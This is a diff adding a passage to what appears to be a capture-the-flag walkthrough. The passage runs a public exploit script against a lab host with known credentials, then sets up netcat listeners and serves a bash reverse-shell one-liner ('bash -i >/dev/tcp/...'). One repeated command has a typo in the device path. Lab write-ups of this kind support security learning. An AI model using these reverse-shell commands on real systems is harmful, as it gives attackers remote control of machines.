@@ -179,6 +179,30 @@ Author :
         WangYihang <wangyihanger@gmail.com>
 ```
 
+We have the credentials for that so try it:
+
+```
+python3 49705.py http://10.10.36.144:62337/ john password <tun-ip> 2222 linux
+
+[+] Please execute the following command on your vps: 
+echo 'bash -c "bash -i >/dev/tcp/<tun-ip>/2223 0>&1 2>&1"' | nc -lnvp 2222
+nc -lnvp 2223
+[+] Please confirm that you have done the two command above [y/n]
+[Y/n]
+
+```
+
+On your machine run this command first:
+
+```
+echo 'bash -c "bash -i >/dev/<tun-address>/2223 0>&1 2>&1"' | nc -lnvp 2222
+```
+
+secondly,
+```
+nc -lnvp 2223
+```
+
 
 
 
